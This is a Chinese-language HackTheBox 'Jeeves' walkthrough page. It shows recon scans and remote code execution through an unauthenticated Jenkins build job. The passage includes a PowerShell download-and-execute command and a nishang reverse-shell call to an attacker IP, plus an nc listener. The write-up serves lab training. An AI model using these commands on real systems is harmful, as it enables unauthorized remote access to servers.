@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Jeeves - T0x1c</title>
+
+  
+    <meta name="description" content="Jeeves是一个中等难度的靶机，知识点涉及Jeekins远程代码执行漏洞、KeePass解密、哈希传递、NTFS数据流读取等。Jenkins存在接口可用于远程代码执行，KeePass加密数据库解密能够获取管理员哈希值。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Jeeves">
+<meta property="og:url" content="https://toxic80l.github.io/post/ee344f5c/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Jeeves是一个中等难度的靶机，知识点涉及Jeekins远程代码执行漏洞、KeePass解密、哈希传递、NTFS数据流读取等。Jenkins存在接口可用于远程代码执行，KeePass加密数据库解密能够获取管理员哈希值。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0190.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%889.14.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%889.33.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8810.10.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8810.14.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8810.14.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8810.15.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8812.44.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8811.12.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8812.46.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8812.48.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8812.59.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%881.00.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.00.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%881.02.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.05.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.09.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.08.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.12.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.23.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.32.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%884.07.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%884.18.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%884.56.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%888.14.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%888.13.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%888.18.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%888.22.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8811.28.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8811.30.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8811.40.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8811.54.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8811.55.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-20%20%E4%B8%8A%E5%8D%8812.00.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-20%20%E4%B8%8A%E5%8D%8812.07.09.png">
+<meta property="article:published_time" content="2022-01-27T03:35:38.000Z">
+<meta property="article:modified_time" content="2022-01-27T07:35:44.427Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0190.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#50000%E7%AB%AF%E5%8F%A3"><span class="toc-text">50000端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-text">目录扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-kohsuke"><span class="toc-text">0x02 上线[kohsuke]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEJenkins%E6%BC%8F%E6%B4%9E"><span class="toc-text">寻找Jenkins漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">远程代码执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%89%A9%E5%B1%95"><span class="toc-text">代码执行漏洞扩展</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%B8%8A%E7%BA%BF-administrator"><span class="toc-text">0x03 上线[administrator]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE"><span class="toc-text">检查系统配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KeePass%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">KeePass加密数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KeePass%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-text">KeePass密码破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E4%B8%8A%E7%BA%BF"><span class="toc-text">管理员上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag"><span class="toc-text">寻找flag</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-01-27T03:35:38.000Z">2022-01-27</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Jeeves</span></h1>
+<p>Jeeves是一个中等难度的靶机，知识点涉及Jeekins远程代码执行漏洞、KeePass解密、哈希传递、NTFS数据流读取等。Jenkins存在接口可用于远程代码执行，KeePass加密数据库解密能够获取管理员哈希值。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0190.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%889.14.33.png" alt="截屏2021-10-19 上午9.14.33"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.63 -oA nmap_Jeeves</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%889.33.14.png" alt="截屏2021-10-19 上午9.33.14"><br>扫描结果显示开放端口为80、135、445以及50000端口</p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8810.10.50.png" alt="截屏2021-10-19 上午10.10.50"><br>网页中存在搜索框，尝试进行搜索出现报错，报错信息显示其中存在SQL server 2005数据库<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8810.14.01.png" alt="截屏2021-10-19 上午10.14.01"></p>
+<h4 id="50000端口"><a href="#50000端口" class="headerlink" title="50000端口"></a>50000端口</h4><p>在80端口未找到利用点，查看50000端口的 Jetty 中间件，版本为9.4.z<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8810.14.19.png" alt="截屏2021-10-19 上午10.14.19"><br>使用 searchsploit 寻找 Jettty 的相关漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit jetty</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8810.15.06.png" alt="截屏2021-10-19 上午10.15.06"><br>结果显示存在一个目录穿越漏洞，但是未能成功利用</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>尝试对80端口和50000端口进行目录扫描，寻找可能存在的应用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.63 -w /usr/share/wordlists/dirb/big.txt -x asp,aspx</span><br><span class="line">gobuster dir -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8812.44.06.png" alt="截屏2021-10-19 下午12.44.06"><br>在50000端口中找到 askjeeves 目录，访问<code>http://10.10.10.63:50000/askjeeves</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8A%E5%8D%8811.12.41.png" alt="截屏2021-10-19 上午11.12.41"><br>结果发现这是 Jenkins 应用，版本为2.87</p>
+<h2 id="0x02-上线-kohsuke"><a href="#0x02-上线-kohsuke" class="headerlink" title="0x02 上线[kohsuke]"></a>0x02 上线[kohsuke]</h2><blockquote>
+<p>Jenkins是一款提供软件开发的持续集成服务的工具，它运行在Servlet容器中（例如Apache Tomcat）。它支持软件配置管理（SCM）工具（包括AccuRev SCM、CVS、Subversion、Git、Perforce、Clearcase和RTC），可以执行基于Apache Ant和Apache Maven的项目，以及任意的Shell脚本和Windows批处理命令</p>
+</blockquote>
+<h3 id="寻找Jenkins漏洞"><a href="#寻找Jenkins漏洞" class="headerlink" title="寻找Jenkins漏洞"></a>寻找Jenkins漏洞</h3><p>使用 searchsploit 查找相关漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit jenkins</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8812.46.36.png" alt="截屏2021-10-19 下午12.46.36"><br>在其中并没有找到版本为2.87相关的漏洞。但是经过浏览发现用户admin<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8812.48.36.png" alt="截屏2021-10-19 下午12.48.36"></p>
+<h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><p>在尝试弱口令无果后发现不登陆情况下也能进行操作，于是在<code>New Item</code>中创建一个项目<code>test</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8812.59.56.png" alt="截屏2021-10-19 下午12.59.56"><br>在<code>Build Environmnet</code>中选择<code>Execute Windows batch command</code>来执行 ping 命令<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%881.00.57.png" alt="截屏2021-10-19 下午1.00.57"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.00.41.png" alt="截屏2021-10-19 下午3.00.41"><br>完成后点击<code>build now</code>并查看输出结果<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%881.02.59.png" alt="截屏2021-10-19 下午1.02.59"><br>成功执行命令，说明目标存在命令执行漏洞。开始构造用于反弹shell的powershell脚本</p>
+<p>使用 nishang 中的 Invoke-PowerShellTcp.ps1 脚本进行反弹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /root/Desktop/nishang/Shells/Invoke-PowerShellTcp.ps1 . </span><br></pre></td></tr></table></figure>
+<p>在脚本最后添加地址和端口进行反弹，同时在当前目录开启 http 服务</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Invoke-PowerShellTcp</span> <span class="string">-Reverse</span> <span class="string">-IPAddress</span> <span class="number">10.10</span><span class="number">.14</span><span class="number">.3</span> <span class="string">-Port</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure>
+<p>在本地监听5555端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555</span><br></pre></td></tr></table></figure>
+<p>在项目中设置执行命令用于反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c iex(new-object net.webclient).downloadstring(<span class="string">&#x27;http://10.10.14.3/Invoke-PowerShellTcp.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.05.37.png" alt="截屏2021-10-19 下午3.05.37"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.09.51.png" alt="截屏2021-10-19 下午3.09.51"><br>完成后点击<code>build now</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.08.56.png" alt="截屏2021-10-19 下午3.08.56"><br>成功拿到反弹shell，在当前用户桌面上寻找第一个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\kohsuke\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\kohsuke\Desktop\user.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.12.46.png" alt="截屏2021-10-19 下午3.12.46"><br>成功拿到第一个flag</p>
